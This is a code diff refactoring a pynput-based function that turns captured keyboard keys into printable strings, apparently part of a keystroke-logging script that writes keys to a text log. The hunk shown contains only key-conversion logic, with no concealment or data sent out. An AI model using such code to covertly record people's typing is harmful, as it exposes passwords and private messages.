@@ -21,20 +21,30 @@ now: _dt = _dt.now()  # Unused, but kept for completeness
 
 def get_key_str(key: _Any) -> str:
     """Convert pynput key to a printable string."""
-    try:
-        return key.char  # For printable chars
-    except AttributeError:
-        return {
-            _keyboard.Key.space: ' ',
-            _keyboard.Key.enter: '\n',
-            _keyboard.Key.tab: '\t',
-            _keyboard.Key.backspace: '[BACKSPACE]',
-            _keyboard.Key.shift: '[SHIFT]',
-            _keyboard.Key.ctrl: '[CTRL]',
-            _keyboard.Key.alt: '[ALT]',
-            _keyboard.Key.cmd: '[CMD]',
-            # Add more as needed
-        }.get(key, str(key))
+    if key is None:
+        return '[unknown]'
+    
+    # Handle KeyCode with char
+    if hasattr(key, 'char') and key.char is not None:
+        return key.char
+    
+    # Fallback for special keys, KeyCode without char, or other
+    special_map = {
+        _keyboard.Key.space: ' ',
+        _keyboard.Key.enter: '\n',
+        _keyboard.Key.tab: '\t',
+        _keyboard.Key.backspace: '[BACKSPACE]',
+        _keyboard.Key.shift: '[SHIFT]',
+        _keyboard.Key.ctrl: '[CTRL]',
+        _keyboard.Key.alt: '[ALT]',
+        _keyboard.Key.cmd: '[CMD]',
+        # Add more Key objects as needed
+    }
+    if isinstance(key, _keyboard.Key):
+        return special_map.get(key, str(key))
+    
+    # For KeyCode without char or other types
+    return str(key)
 
 
 def generate_text_log(key_str: str) -> None:
